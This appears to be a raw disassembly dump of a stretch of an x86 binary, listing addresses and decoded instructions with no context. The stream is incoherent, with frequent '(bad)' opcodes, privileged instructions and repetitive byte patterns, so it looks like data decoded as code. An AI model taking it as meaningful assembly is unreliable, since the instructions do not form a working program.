  419083:	movups xmm2,XMMWORD PTR [eax]
  419086:	(bad)  
  419087:	(bad)  
  419088:	mov    db2,eax
  41908b:	jnp    0x419048
  41908d:	jns    0x4190eb
  41908f:	pop    ecx
  419090:	pop    edx
  419091:	inc    edx
  419092:	cs cs inc esi
  419095:	dec    ebp
  419096:	inc    esi
  419097:	mov    eax,0xce9fa2c9
  41909c:	xchg   esp,eax
  41909d:	cmp    edx,DWORD PTR fs:[eax]
  4190a0:	add    DWORD PTR [esi],eax
  4190a2:	or     BYTE PTR [edi],cl
  4190a4:	sub    DWORD PTR [eax+ebx*4-0x41],edx
  4190a8:	mov    esp,0xb1b1a087
  4190ad:	mov    cl,0xa0
  4190af:	mov    dl,0x8a
  4190b1:	js     0x419043
  4190b3:	js     0x419100
  4190b5:	jp     0x419080
  4190b7:	xchg   edi,eax
  4190b8:	jnp    0x4190f8
  4190ba:	and    ecx,DWORD PTR [edi]
  4190bc:	or     BYTE PTR [edi],cl
  4190be:	invd   
  4190c0:	clts   
  4190c2:	or     BYTE PTR [eax],cl
  4190c4:	adc    eax,0x70573617
  4190c9:	lea    ecx,[edi-0x423d465e]
  4190cf:	mov    ebp,0xc0bdc0bd
  4190d4:	mov    edi,0xa2bcc0c0
  4190da:	jo     0x41912c
  4190dc:	sub    DWORD PTR ds:0xf0f0f10,edx
  4190e2:	adc    eax,0x15151015
  4190e7:	adc    BYTE PTR [edi],cl
  4190e9:	and    BYTE PTR [ebx],bh
  4190eb:	outs   dx,DWORD PTR ds:[esi]
  4190ec:	xchg   edi,eax
  4190ed:	ret    
  4190ee:	int    0xa0
  4190f0:	inc    esp
  4190f1:	inc    esp
  4190f2:	pop    esi
  4190f3:	inc    esp
  4190f4:	sub    BYTE PTR ds:0xc0312744,ch
  4190fa:	(bad)  
  4190fb:	pop    edi
  4190fc:	xor    al,0x15
  4190fe:	adc    BYTE PTR [eax],cl
  419100:	clts   
  419102:	or     BYTE PTR [eax],cl
  419104:	movups xmm0,XMMWORD PTR [esi]
  419107:	or     BYTE PTR [edi],cl
  419109:	and    BYTE PTR [eax+0x7b],dl
  41910c:	mov    eax,0x5a683276
  419111:	cmp    DWORD PTR [esi],esp
  419113:	cs cs inc edi
  419116:	dec    esp
  419117:	add    bh,0xc7
  41911a:	mov    al,ds:0x34628fcd
  41911f:	adc    BYTE PTR [esi],al
  419121:	push   es
  419122:	adc    BYTE PTR [eax],ah
  419124:	sub    DWORD PTR [ebp+ecx*4-0x56],edx
  419128:	mov    esp,0x93938978
  41912d:	mov    edi,0x8a8ab1b0
  419132:	sub    DWORD PTR [edx-0x703fb078],0x7f
  419139:	push   ecx
  41913a:	and    ecx,DWORD PTR [edi]
  41913c:	push   es
  41913d:	invd   
  41913f:	push   es
  419140:	clts   
  419142:	or     BYTE PTR [eax],cl
  419144:	adc    BYTE PTR [eax],dl
  419146:	and    BYTE PTR [esi+edi*1],ch
  419149:	pop    edi
  41914a:	outs   dx,DWORD PTR ds:[esi]
  41914b:	jnp    0x4191cc
  41914d:	jg     0x4190dc
  41914f:	lea    ecx,[ebp-0x72727073]
  419155:	lea    edi,[edi+0x7b]
  419158:	je     0x4191ba
  41915a:	push   eax
  41915b:	xor    al,0x23
  41915d:	adc    eax,0xf151710
  419162:	unpckhps xmm2,XMMWORD PTR [eax]
  419165:	(bad)  
  419166:	movups xmm2,XMMWORD PTR [eax]
  419169:	and    edi,DWORD PTR [esi]
  41916b:	jo     0x41910e
  41916d:	int    0xc2
  41916f:	sahf   
  419170:	imul   eax,DWORD PTR [edx+0x6c],0x4411452e
  419177:	xor    bl,BYTE PTR ds:0x367097c0
  41917d:	and    BYTE PTR [eax],dl
  41917f:	or     BYTE PTR [edi],cl
  419181:	(bad)  
  419182:	(bad)  
  419183:	(bad)  
  419184:	invd   
  419186:	or     BYTE PTR [eax],cl
  419188:	or     BYTE PTR [edi],dl
  41918a:	push   eax
  41918b:	jnp    0x419148
  41918d:	xchg   edx,eax
  41918e:	inc    esp
  41918f:	inc    ecx
  419190:	and    al,0x3a
  419192:	sub    BYTE PTR cs:[edx],ah
  419195:	imul   ecx,DWORD PTR [ebx+0x5e],0xffffffc9
  419199:	mov    esp,0x5f8dceb8
  41919e:	sub    al,0x10
  4191a0:	add    DWORD PTR [ecx],eax
  4191a2:	or     BYTE PTR ds:0xb88d6034,dl
  4191a8:	rcr    BYTE PTR [ebx+0x7b5a6985],0xae
  4191af:	popf   
  4191b0:	mov    al,BYTE PTR [edi-0x783e7079]
  4191b6:	scas   eax,DWORD PTR es:[edi]
  4191b7:	mov    esp,0x102c5f8d
  4191bc:	or     BYTE PTR [eax],cl
  4191be:	push   es
  4191bf:	push   es
  4191c0:	(bad)  
  4191c1:	invd   
  4191c3:	or     BYTE PTR [eax],cl
  4191c5:	or     BYTE PTR [edi],cl
  4191c7:	adc    BYTE PTR [ebx],ah
  4191c9:	sub    al,0x36
  4191cb:	push   eax
  4191cc:	push   esp
  4191cd:	pop    edi
  4191ce:	pop    edi
  4191cf:	pusha  
  4191d0:	pop    edi
  4191d1:	pusha  
  4191d2:	pop    edi
  4191d3:	pusha  
  4191d4:	pusha  
  4191d5:	pusha  
  4191d6:	pop    edi
  4191d7:	push   edi
  4191d8:	push   ecx
  4191d9:	cmp    esi,DWORD PTR [ebx+eiz*1]
  4191dc:	adc    eax,0x10101010
  4191e1:	adc    BYTE PTR ds:0xf0f1015,dl
  4191e7:	invd   
  4191e9:	and    edi,DWORD PTR [ebx]
  4191eb:	outs   dx,DWORD PTR ds:[esi]
  4191ec:	mov    eax,ds:0x847acbc8
  4191f1:	das    
  4191f2:	ins    DWORD PTR es:[edi],dx
  4191f3:	sbb    DWORD PTR [eax],ebp
  4191f5:	pop    esp
  4191f6:	inc    esp
  4191f7:	sbb    al,0x68
  4191f9:	(bad)  
  4191fa:	mov    eax,ds:0x1023517b
  4191ff:	(bad)  
  419200:	invd   
  419202:	or     BYTE PTR [eax],cl
  419204:	clts   
  419206:	clts   
  419208:	mov    esi,cr7
  41920b:	jnp    0x4191b7
  41920d:	sar    BYTE PTR [ecx+0x2d],0x35
  419211:	dec    eax
  419212:	inc    esi
  419213:	adc    DWORD PTR cs:[edx-0x43386993],edx
  41921a:	retf   0x74bd
  41921d:	push   eax
  41921e:	sub    DWORD PTR [eax],edx
  419220:	push   es
  419221:	push   es
  419222:	or     BYTE PTR ds:0xbd986436,dl
  419228:	mov    ebp,0x9f867a85
  41922d:	lahf   
  41922e:	lahf   
  41922f:	lahf   
  419230:	outs   dx,BYTE PTR ds:[esi]
  419231:	dec    ebp
  419232:	ins    DWORD PTR es:[edi],dx
  419233:	ins    DWORD PTR es:[edi],dx
  419234:	mov    esi,0x8fc0afc1
  419239:	pusha  
  41923a:	sub    al,0x10
  41923c:	or     BYTE PTR [edi],cl
  41923e:	invd   
  419240:	invd   
  419242:	or     BYTE PTR [eax],cl
  419244:	invd   
  419246:	(bad)  
  419247:	unpckhps xmm2,XMMWORD PTR [eax]
  41924a:	adc    eax,0x2c292323
  41924f:	sub    al,0x29
  419251:	sub    al,0x34
  419253:	sub    al,0x29
  419255:	xor    al,0x36
  419257:	sub    DWORD PTR [ebx],esp
  419259:	and    BYTE PTR [edi],dl
  41925b:	pop    ss
  41925c:	adc    eax,0x80f0f0f
  419261:	movups xmm2,XMMWORD PTR ds:0x10101010
  419268:	mov    db7,esi
  41926b:	jo     0x41920e
  41926d:	retf   0x32c4
  419270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419271:	imul   ecx,DWORD PTR [edx+0x47],0x10
  419275:	pop    ebx
  419276:	sub    eax,0xaabc671c
  41927b:	lea    esp,[eax+0x2c]
  41927e:	and    BYTE PTR [eax],dl
  419280:	or     BYTE PTR [eax],cl
  419282:	clts   
  419284:	or     BYTE PTR [esi],al
  419286:	or     BYTE PTR [eax],cl
  419288:	mov    db2,eax
  41928b:	je     0x41922f
  41928d:	stos   BYTE PTR es:[edi],al
  41928e:	lea    edx,[ebx]
  419290:	inc    edx
  419291:	ins    BYTE PTR es:[edi],dx
  419292:	dec    edx
  419293:	ins    BYTE PTR es:[edi],dx
  419294:	inc    esp
  419295:	sub    BYTE PTR [ecx-0x44473f39],bl
  41929b:	ret    0x3660
  41929e:	pop    ss
  41929f:	sgdtd  [ecx]
  4192a2:	or     BYTE PTR [eax],ah
  4192a4:	ds jo  0x41924c
  4192a7:	test   eax,0x9c7a6b4c
  4192ac:	pushf  
  4192ad:	xchg   BYTE PTR [esp+ebx*4+0x30494d87],bl
  4192b4:	ins    DWORD PTR es:[edi],dx
  4192b5:	retf   0xa3ca
  4192b8:	(bad)  
  4192b9:	pusha  
  4192ba:	xor    al,0x15
  4192bc:	clts   
  4192be:	add    DWORD PTR [eax],ecx
  4192c0:	or     BYTE PTR [eax],cl
  4192c2:	or     BYTE PTR [edi],cl
  4192c4:	or     BYTE PTR [eax],cl
  4192c6:	or     BYTE PTR [edi],cl
  4192c8:	movups xmm2,XMMWORD PTR ds:0x15101010
  4192cf:	movups xmm2,XMMWORD PTR [eax]
  4192d2:	adc    BYTE PTR [eax],dl
  4192d4:	adc    BYTE PTR [eax],dl
  4192d6:	adc    BYTE PTR ds:0x10101015,dl
  4192dc:	(bad)  
  4192dd:	(bad)  
  4192de:	invd   
  4192e0:	(bad)  
  4192e1:	invd   
  4192e3:	movups xmm1,XMMWORD PTR [edi]
  4192e6:	(bad)  
  4192e7:	(bad)  
  4192e8:	mov    esi,cr7
  4192eb:	jo     0x41928e
  4192ed:	into   
  4192ee:	call   0x4447:0x4591915c
  4192f5:	inc    esp
  4192f6:	inc    esp
  4192f7:	xor    bh,BYTE PTR [ecx]
  4192f9:	and    edx,DWORD PTR [ebx+0x233b7097]
  4192ff:	or     BYTE PTR [esi],al
  419301:	invd   
  419303:	push   es
  419304:	or     BYTE PTR [eax],cl
  419306:	push   es
  419307:	push   es
  419308:	mov    db2,eax
  41930b:	jnp    0x4192b7
  41930d:	mov    esp,0x5e0173c0
  419312:	dec    edx
  419313:	dec    edx
  419314:	xor    ecx,DWORD PTR [edx]
  419316:	imul   eax,eax,0x7494b8c0
  41931c:	push   eax
  41931d:	sub    DWORD PTR ds:0x8010108,edx
  419323:	and    BYTE PTR [esi],bh
  419325:	jnp    0x4192d0
  419327:	mov    esi,0x85696d4c
  41932c:	jp     0x4192b3
  41932e:	xchg   BYTE PTR [ebx+0x30468789],dl
  419334:	inc    edi
  419335:	lods   al,BYTE PTR ds:[esi]
  419336:	retf   0x8fa3
  419339:	pusha  
  41933a:	sub    al,0x10
  41933c:	or     BYTE PTR [eax],cl
  41933e:	or     BYTE PTR [eax],cl
  419340:	push   es
  419341:	or     BYTE PTR [esi],al
  419343:	push   es
  419344:	push   es
  419345:	push   es
  419346:	or     BYTE PTR [eax],cl
  419348:	(bad)  
  419349:	movups xmm1,XMMWORD PTR [edi]
  41934c:	adc    BYTE PTR [eax],dl
  41934e:	invd   
  419350:	or     BYTE PTR [esi],al
  419352:	or     BYTE PTR [eax],cl
  419354:	or     BYTE PTR [edi],cl
  419356:	push   es
  419357:	or     BYTE PTR [eax],cl
  419359:	or     BYTE PTR [edi],cl
  41935b:	(bad)  
  41935c:	(bad)  
  41935d:	(bad)  
  41935e:	(bad)  
  41935f:	(bad)  
  419360:	invd   
  419362:	(bad)  
  419363:	movups xmm2,XMMWORD PTR [eax]
  419366:	or     BYTE PTR [edi],cl
  419368:	or     BYTE PTR [ebx],ah
  41936a:	cmp    ebp,DWORD PTR [edi-0x5f]
  41936d:	ret    
  41936e:	mov    esp,0x1073b02c
  419373:	ins    BYTE PTR es:[edi],dx
  419374:	dec    edx
  419375:	pop    esp
  419376:	inc    esp
  419377:	inc    esp
  419378:	pop    ss
  419379:	add    BYTE PTR [eax+0x23547bc1],ah
  41937f:	adc    BYTE PTR [edi],cl
  419381:	or     BYTE PTR [esi],al
  419383:	push   es
  419384:	push   es
  419385:	push   es
  419386:	push   es
  419387:	push   es
  419388:	mov    db2,ecx
  41938b:	jnp    0x419326
  41938d:	mov    edi,0x335fc9b8
  419392:	outs   dx,BYTE PTR ds:[esi]
  419393:	ins    BYTE PTR es:[edi],dx
  419394:	pop    esi
  419395:	pop    edx
  419396:	dec    edx
  419397:	or     eax,0x5f8daac0
  41939c:	ss pop ss
  41939e:	adc    BYTE PTR [eax],cl
  4193a0:	add    DWORD PTR [ecx],eax
  4193a2:	or     BYTE PTR [eax],ah
  4193a4:	push   ecx
  4193a5:	jg     0x419364
  4193a7:	lods   al,BYTE PTR ds:[esi]
  4193a8:	pop    ds
  4193a9:	test   DWORD PTR [ebp-0x7c858988],eax
  4193af:	jp     0x419339
  4193b1:	imul   ecx,DWORD PTR [edx+0x4c],0xcdc5a74c
  4193b8:	jg     0x41941a
  4193ba:	sub    al,0x15
  4193bc:	or     BYTE PTR [esi],al
  4193be:	push   es
  4193bf:	or     BYTE PTR [eax],cl
  4193c1:	push   es
  4193c2:	or     BYTE PTR [esi],al
  4193c4:	or     BYTE PTR [esi],al
  4193c6:	push   es
  4193c7:	or     BYTE PTR [eax],cl
  4193c9:	invd   
  4193cb:	or     BYTE PTR [eax],cl
  4193cd:	or     BYTE PTR [eax],dl
  4193cf:	adc    BYTE PTR [eax],dl
  4193d1:	movups xmm1,XMMWORD PTR [edi]
  4193d4:	(bad)  
  4193d5:	(bad)  
  4193d6:	invd   
  4193d8:	invd   
  4193da:	clts   
  4193dc:	invd   
  4193de:	or     BYTE PTR [eax],cl
  4193e0:	or     BYTE PTR [edi],cl
  4193e2:	invd   
  4193e4:	or     BYTE PTR [edi],cl
  4193e6:	or     BYTE PTR [edi],cl
  4193e8:	mov    ebx,cr7
  4193eb:	jo     0x41938e
  4193ed:	ret    
  4193ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ef:	adc    al,0x66
  4193f1:	xchg   ebx,eax
  4193f2:	pop    eax
  4193f3:	inc    esp
  4193f4:	pop    ebx
  4193f5:	xor    al,BYTE PTR [ebp+ebp*1+0x21]
  4193f9:	cmp    DWORD PTR [ecx+0x2c5f8dc9],esi
  4193ff:	adc    BYTE PTR [edi],cl
  419401:	push   es
  419402:	or     BYTE PTR [esi],al
  419404:	or     BYTE PTR [esi],al
  419406:	push   es
  419407:	push   es
  419408:	mov    db2,ecx
  41940b:	jg     0x4193b6
  41940d:	int3   
  41940e:	dec    esi
  41940f:	ret    0x44c7
  419412:	outs   dx,BYTE PTR ds:[esi]
  419413:	ins    DWORD PTR es:[edi],dx
  419414:	ins    BYTE PTR es:[edi],dx
  419415:	inc    esi
  419416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419417:	js     0x4193b7
  419419:	ror    BYTE PTR [ebp+0x8102c5f],0x6
  419420:	push   es
  419421:	add    DWORD PTR [eax],ecx
  419423:	and    BYTE PTR [edi+edi*2-0x39],dl
  419427:	stos   DWORD PTR es:[edi],eax
  419428:	push   ds
  419429:	mov    BYTE PTR [ecx+0x44],ch
  41942c:	imul   eax,DWORD PTR [esi-0x7892576e],0xc7bdafa0
  419436:	ret    
  419437:	int    0x8d
  419439:	pusha  
  41943a:	ss pop ss
  41943c:	or     BYTE PTR [esi],al
  41943e:	push   es
  41943f:	push   es
  419440:	push   es
  419441:	or     BYTE PTR [esi],al
  419443:	push   es
  419444:	or     BYTE PTR [eax],cl
  419446:	or     BYTE PTR [eax],cl
  419448:	or     BYTE PTR [edi],cl
  41944a:	or     BYTE PTR [edi],cl
  41944c:	or     BYTE PTR [eax],cl
  41944e:	invd   
  419450:	invd   
  419452:	invd   
  419454:	(bad)  
  419455:	movups xmm1,XMMWORD PTR [edi]
  419458:	adc    BYTE PTR [edi],cl
  41945a:	(bad)  
  41945b:	(bad)  
  41945c:	invd   
  41945e:	invd   
  419460:	invd   
  419462:	(bad)  
  419463:	(bad)  
  419464:	(bad)  
  419465:	invd   
  419467:	or     BYTE PTR [edi],cl
  419469:	pop    ss
  41946a:	outs   dx,DWORD PTR ds:[esi]
  41946c:	mov    eax,ds:0x493093ca
  419471:	and    edx,DWORD PTR [ebx+0x5b5b2776]
  419477:	cmp    DWORD PTR [ecx],edi
  419479:	pop    ebx
  41947a:	iret   
  41947b:	rcl    DWORD PTR [edx+eiz*2+0x8081534],0x1
  419483:	push   es
  419484:	add    DWORD PTR [eax],ecx
  419486:	push   es
  419487:	push   es
  419488:	mov    db2,esp
  41948b:	jg     0x41944a
  41948d:	retf   
  41948e:	pushf  
  41948f:	ins    BYTE PTR es:[edi],dx
  419490:	pop    esp
  419491:	inc    ebp
  419492:	ins    BYTE PTR es:[edi],dx
  419493:	pop    esp
  419494:	inc    ebp
  419495:	sbb    eax,0xcc0bad79
  41949a:	(bad)  
  41949b:	pusha  
  41949c:	xor    al,0x10
  41949e:	or     BYTE PTR [ecx],al
  4194a0:	add    DWORD PTR [ecx],eax
  4194a2:	or     BYTE PTR [ebx],ah
  4194a4:	push   esp
  4194a5:	jg     0x419463
  4194a7:	xchg   ebp,eax
  4194a8:	xor    DWORD PTR [edi+0x48324869],eax
  4194ae:	inc    esp
  4194af:	popf   
  4194b0:	ret    
  4194b1:	(bad)  
  4194b2:	retf   0xc7c9
  4194b5:	sar    BYTE PTR [eax+0x29578daa],0x10
  4194bc:	push   es
  4194bd:	or     BYTE PTR [ecx],al
  4194bf:	or     BYTE PTR [esi],al
  4194c1:	push   es
  4194c2:	push   es
  4194c3:	push   es
  4194c4:	or     BYTE PTR [esi],al
  4194c6:	push   es
  4194c7:	push   es
  4194c8:	(bad)  
  4194c9:	invd   
  4194cb:	or     BYTE PTR [eax],cl
  4194cd:	invd   
  4194cf:	or     BYTE PTR [eax],cl
  4194d1:	(bad)  
  4194d2:	(bad)  
  4194d3:	(bad)  
  4194d4:	(bad)  
  4194d5:	invd   
  4194d7:	adc    BYTE PTR [edi],cl
  4194d9:	adc    BYTE PTR [edi],cl
  4194db:	adc    BYTE PTR [eax],cl
  4194dd:	invd   
  4194df:	or     BYTE PTR [eax],cl
  4194e1:	push   es
  4194e2:	clts   
  4194e4:	push   es
  4194e5:	invd   
  4194e7:	(bad)  
  4194e8:	movhps QWORD PTR [esi],xmm7
  4194eb:	outs   dx,DWORD PTR ds:[esi]
  4194ec:	mov    eax,ds:0x6d4776cb
  4194f1:	push   ebx
  4194f2:	pop    ebx
  4194f3:	test   BYTE PTR [ebx+0x5c],bl
  4194f6:	inc    esp
  4194f7:	cmp    DWORD PTR [ecx],edi
  4194f9:	cmp    ch,dl
  4194fb:	mov    esp,0x10366494
  419500:	push   es
  419501:	or     BYTE PTR [eax],cl
  419503:	add    DWORD PTR [esi],eax
  419505:	or     BYTE PTR [esi],al
  419507:	or     BYTE PTR [eax],dl
  419509:	sub    al,0x5f
  41950b:	jg     0x41957d
  41950d:	pushf  
  41950e:	popf   
  41950f:	imul   ebp,DWORD PTR [ebp+0x6d],0x6d
  419513:	dec    edx
  419514:	xor    ch,BYTE PTR [edi]
  419516:	pop    edx
  419517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419518:	or     edx,ebp
  41951a:	mov    ecx,0x6153664
  41951f:	add    DWORD PTR [esi],eax
  419521:	add    DWORD PTR [eax],ecx
  419523:	pop    ss
  419524:	push   ecx
  419525:	jg     0x4194e7
  419527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419528:	xor    DWORD PTR [esi+0x42],ebx
  41952b:	inc    esp
  41952c:	inc    edx
  41952d:	pop    ebp
  41952e:	push   0xafbea76c
  419533:	mov    BYTE PTR [ebx+0x7fb8c0c7],ah
  419539:	push   edi
  41953a:	sub    al,0x10
  41953c:	push   es
  41953d:	or     BYTE PTR [esi],al
  41953f:	push   es
  419540:	or     BYTE PTR [eax],cl
  419542:	or     BYTE PTR [esi],al
  419544:	push   es
  419545:	push   es
  419546:	or     BYTE PTR [esi],al
  419548:	or     BYTE PTR [edi],cl
  41954a:	or     BYTE PTR [esi],al
  41954c:	or     BYTE PTR [edi],cl
  41954e:	or     BYTE PTR [eax],cl
  419550:	push   es
  419551:	push   es
  419552:	or     BYTE PTR [eax],dl
  419554:	adc    eax,0x23202017
  419559:	pop    ss
  41955a:	adc    eax,0xf0f1015
  41955f:	(bad)  
  419560:	(bad)  
  419561:	(bad)  
  419562:	(bad)  
  419563:	(bad)  
  419564:	invd   
  419566:	or     BYTE PTR [eax],cl
  419568:	unpckhps xmm7,XMMWORD PTR [ebx]
  41956b:	jo     0x41950e
  41956d:	ret    
  41956e:	xchg   DWORD PTR [ebp+ecx*2+0x48],ecx
  419572:	inc    esp
  419573:	pop    esp
  419574:	jbe    0x4195f0
  419576:	pop    ebx
  419577:	push   ebx
  419578:	inc    ecx
  419579:	cmp    bl,dl
  41957b:	rcl    DWORD PTR [edi+0x610366f],0x6
  419582:	push   es
  419583:	or     BYTE PTR [esi],al
  419585:	or     BYTE PTR [eax],dl
  419587:	pop    ss
  419588:	sub    DWORD PTR [eax+0x6f],edx
  41958b:	(bad)  
  41958c:	xchg   esi,eax
  41958d:	mov    esi,0x4a2f395e
  419592:	ins    DWORD PTR es:[edi],dx
  419593:	inc    edi
  419594:	inc    ebp
  419595:	inc    ebp
  419596:	das    
  419597:	sbb    edx,DWORD PTR [edx*8+0x153b70c3]
  41959e:	or     BYTE PTR [esi],al
  4195a0:	add    DWORD PTR [ecx],eax
  4195a2:	or     BYTE PTR [edi],dl
  4195a4:	push   eax
  4195a5:	jnp    0x419567
  4195a7:	test   al,0x1d
  4195a9:	adc    BYTE PTR [ebp+0x48],al
  4195ac:	inc    edx
  4195ad:	imul   edx,DWORD PTR [eax-0x7d],0x47306caf
  4195b4:	dec    ebx
  4195b5:	test   DWORD PTR [edi+eax*8+0x173660a1],edi
  4195bc:	invd   
  4195be:	push   es
  4195bf:	push   es
  4195c0:	push   es
  4195c1:	or     BYTE PTR [edi],cl
  4195c3:	or     BYTE PTR [edi],cl
  4195c5:	or     BYTE PTR [eax],cl
  4195c7:	push   es
  4195c8:	or     BYTE PTR [eax],cl
  4195ca:	push   es
  4195cb:	or     BYTE PTR [eax],cl
  4195cd:	or     BYTE PTR [esi],al
  4195cf:	or     BYTE PTR [esi],al
  4195d1:	push   es
  4195d2:	adc    BYTE PTR ds:0x3b362c23,dl
  4195d8:	ss sub al,0x20
  4195db:	adc    eax,0x80f0810
  4195e0:	or     BYTE PTR [esi],al
  4195e2:	or     BYTE PTR [eax],cl
  4195e4:	or     BYTE PTR [eax],cl
  4195e6:	or     BYTE PTR [edi],cl
  4195e8:	or     BYTE PTR ds:0x9c97703e,dl
  4195ee:	es dec edi
  4195f0:	dec    ebp
  4195f1:	dec    edx
  4195f2:	pop    eax
  4195f3:	pop    ebx
  4195f4:	dec    esp
  4195f5:	sub    DWORD PTR [esp+eax*2],0xc2d54142
  4195fc:	xchg   esp,eax
  4195fd:	bound  esi,QWORD PTR [eax+edx*1]
  419600:	or     BYTE PTR [esi],al
  419602:	push   es
  419603:	push   es
  419604:	adc    BYTE PTR [eax],dl
  419606:	and    BYTE PTR [esi],dh
  419608:	push   esp
  419609:	outs   dx,DWORD PTR ds:[esi]
  41960a:	lea    esp,[ecx+0x2633c1b8]
  419610:	cmp    ch,BYTE PTR [esi+ebx*2+0x28]
  419614:	cs inc esi
  419616:	inc    esp
  419617:	sbb    esi,DWORD PTR [edx]
  419619:	sar    DWORD PTR [ebx+0x6153670],cl
  41961f:	add    DWORD PTR [ecx],eax
  419621:	push   es
  419622:	push   es
  419623:	adc    eax,0xa4bb743e
  419628:	cs push ebx
  41962a:	inc    ebx
  41962b:	xor    ch,BYTE PTR [eax+edi*2]
  41962e:	jns    0x4195d7
  419630:	lods   eax,DWORD PTR ds:[esi]
  419631:	scas   eax,DWORD PTR es:[edi]
  419632:	sub    eax,0x6e4c1d23
  419637:	mov    eax,0x29517497
  41963c:	adc    eax,0x606080f
  419641:	push   es
  419642:	or     BYTE PTR [ecx],al
  419644:	push   es
  419645:	or     BYTE PTR [eax],cl
  419647:	push   es
  419648:	add    DWORD PTR [eax],ecx
  41964a:	push   es
  41964b:	or     BYTE PTR [eax],cl
  41964d:	or     BYTE PTR [eax],cl
  41964f:	push   es
  419650:	or     BYTE PTR [eax],dl
  419652:	adc    eax,0x62543b29
  419657:	outs   dx,DWORD PTR ds:[esi]
  419658:	je     0x4196aa
  41965a:	sub    al,0x17
  41965c:	(bad)  
  41965d:	clts   
  41965f:	or     BYTE PTR [edi],cl
  419661:	or     BYTE PTR [edi],cl
  419663:	or     BYTE PTR [eax],cl
  419665:	or     BYTE PTR [eax],cl
  419667:	or     BYTE PTR [eax],cl
  419669:	pop    ss
  41966a:	cmp    esi,DWORD PTR [eax-0x5f]
  41966d:	mov    edx,0x4d6d4d1e
  419672:	dec    eax
  419673:	pop    edx
  419674:	inc    edi
  419675:	sub    al,0x50
  419677:	dec    edx
  419678:	inc    edx
  419679:	inc    eax
  41967a:	aad    0xc1
  41967c:	xchg   esp,eax
  41967d:	pusha  
  41967e:	sub    al,0x10
  419680:	push   es
  419681:	or     BYTE PTR [eax],cl
  419683:	movhps QWORD PTR [ecx],xmm5
  419686:	bound  edi,QWORD PTR ds:[ebx-0x73]
  41968a:	xchg   edi,eax
  41968b:	mov    ebp,0x4781b8a1
  419690:	ins    BYTE PTR es:[edi],dx
  419691:	dec    ecx
  419692:	dec    edx
  419693:	inc    ebp
  419694:	xor    dh,BYTE PTR [edx]
  419696:	cmp    cl,BYTE PTR [ebx]
  419698:	popf   
  419699:	rcl    DWORD PTR [edi+0x6103664],cl
  41969f:	add    DWORD PTR [ecx],eax
  4196a1:	add    DWORD PTR [esi],eax
  4196a3:	adc    eax,0x92a16f36
  4196a8:	imul   ebp,DWORD PTR [ebx+0x6b],0x685a5978
  4196af:	jp     0x41965c
  4196b1:	test   BYTE PTR [eax],dl
  4196b3:	dec    eax
  4196b4:	dec    edx
  4196b5:	imul   edi,DWORD PTR [edx+0x648da1c0],0x51
  4196bc:	sub    al,0x17
  4196be:	adc    BYTE PTR [eax],cl
  4196c0:	push   es
  4196c1:	push   es
  4196c2:	push   es
  4196c3:	or     BYTE PTR [eax],cl
  4196c5:	push   es
  4196c6:	push   es
  4196c7:	push   es
  4196c8:	push   es
  4196c9:	or     BYTE PTR [esi],al
  4196cb:	push   es
  4196cc:	push   es
  4196cd:	push   es
  4196ce:	or     BYTE PTR [edi],cl
  4196d0:	adc    BYTE PTR ds:0x7b645129,dl
  4196d6:	mov    eax,ds:0x3e74acb9
  4196db:	and    edx,DWORD PTR [eax]
  4196dd:	push   es
  4196de:	push   es
  4196df:	or     BYTE PTR [eax],cl
  4196e1:	push   es
  4196e2:	or     BYTE PTR [eax],cl
  4196e4:	or     BYTE PTR [edi],cl
  4196e6:	or     BYTE PTR [esi],al
  4196e8:	or     BYTE PTR [edi],dl
  4196ea:	outs   dx,DWORD PTR ds:[esi]
  4196ec:	mov    eax,ds:0x6d4b85c9
  4196f1:	xor    BYTE PTR [ebp+ebx*2+0x42],ch
  4196f5:	pop    ss
  4196f6:	aaa    
  4196f7:	ins    BYTE PTR es:[edi],dx
  4196f8:	pop    edx
  4196f9:	cmp    dl,ch
  4196fb:	mov    ebp,0x102c608d
  419700:	or     BYTE PTR [eax],cl
  419702:	adc    BYTE PTR [edi],dl
  419704:	sub    al,0x51
  419706:	jo     0x419697
  419708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419709:	lods   al,BYTE PTR ds:[esi]
  41970a:	leave  
  41970b:	retf   0xb8ca
  41970e:	mov    eax,0x48283193
  419713:	inc    ebp
  419714:	sbb    ch,BYTE PTR [ecx+0x49]
  419717:	or     esi,DWORD PTR [ecx+0x295f8dca]
  41971d:	adc    BYTE PTR [esi],al
  41971f:	add    DWORD PTR [ecx],eax
  419721:	add    DWORD PTR [ecx],eax
  419723:	sysenter 
  419725:	bound  edx,QWORD PTR [esi+ecx*4+0x5a425d32]
  41972c:	jp     0x4197a8
  41972e:	cmp    dl,BYTE PTR [edx+0x5d5e2e90]
  419734:	dec    eax
  419735:	xor    ch,BYTE PTR [ecx-0x6b684744]
  41973b:	jo     0x419791
  41973d:	and    BYTE PTR ss:[eax],dl
  419740:	invd   
  419742:	push   es
  419743:	push   es
  419744:	push   es
  419745:	push   es
  419746:	add    DWORD PTR [esi],eax
  419748:	push   es
  419749:	push   es
  41974a:	or     BYTE PTR [eax],cl
  41974c:	push   es
  41974d:	or     BYTE PTR [edi],cl
  41974f:	adc    BYTE PTR [edi],dl
  419751:	xor    al,0x54
  419753:	jo     0x4196e4
  419755:	mov    eax,0x94ac7aca
  41975a:	push   edi
  41975b:	sub    al,0x10
  41975d:	or     BYTE PTR [eax],cl
  41975f:	push   es
  419760:	or     BYTE PTR [eax],cl
  419762:	or     BYTE PTR [eax],cl
  419764:	or     BYTE PTR [eax],cl
  419766:	push   es
  419767:	push   es
  419768:	or     BYTE PTR [edi],dl
  41976a:	cmp    ebp,DWORD PTR [edi-0x5f]
  41976d:	leave  
  41976e:	mov    eax,0x6d424c1e
  419773:	ins    DWORD PTR es:[edi],dx
  419774:	inc    ebp
  419775:	inc    esp
  419776:	inc    esi
  419777:	ins    DWORD PTR es:[edi],dx
  419778:	jp     0x4197f3
  41977a:	rol    edi,cl
  41977c:	lea    edx,[edi+0x29]
  41977f:	clts   
  419781:	unpckhps xmm5,XMMWORD PTR [ecx]
  419784:	push   ecx
  419785:	je     0x41971b
  419787:	mov    ecx,0xcac893c9
  41978c:	retf   0xb878
  41978f:	mov    eax,0x1c6aacc2
  419794:	sub    BYTE PTR [eax+0x2f],bh
  419797:	sbb    ecx,esp
  419799:	mov    ebx,0x820507b
  41979e:	push   es
